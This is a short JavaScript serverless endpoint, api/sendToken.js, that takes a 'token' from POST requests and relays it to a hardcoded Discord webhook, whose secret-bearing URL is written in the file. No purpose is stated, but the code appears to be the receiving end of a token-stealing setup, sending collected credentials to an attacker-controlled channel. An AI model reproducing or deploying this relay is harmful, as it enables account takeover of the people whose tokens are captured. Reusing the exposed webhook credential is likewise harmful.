// api/sendToken.js
export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { token } = req.body;

    // Discord webhook URL
    const webhookURL = 'https://discord.com/api/webhooks/1333612145115664394/qAG8XiHS0hI9TfNqR2jKViMZ4vZDd_H0Dr7caazZ0Y0LNL_sA9P2rfPvtRgqhr2ZtvYN';

    try {
      // Send the token to Discord webhook
      const response = await fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `Token received: ${token}`,  // Send the token as the message content
        }),
      });

      const responseBody = await response.text();  // Get response as text

      // Check if the response is a valid JSON
      try {
        const jsonResponse = JSON.parse(responseBody);
        res.status(200).json({ message: 'Token sent successfully!' });
      } catch (jsonError) {
        res.status(500).json({ error: 'Webhook did not return valid JSON', response: responseBody });
      }
    } catch (error) {
      res.status(500).json({ error: 'Server error', details: error.message });
    }
  } else {
    res.status(405).json({ error: 'Method Not Allowed' });
  }
}
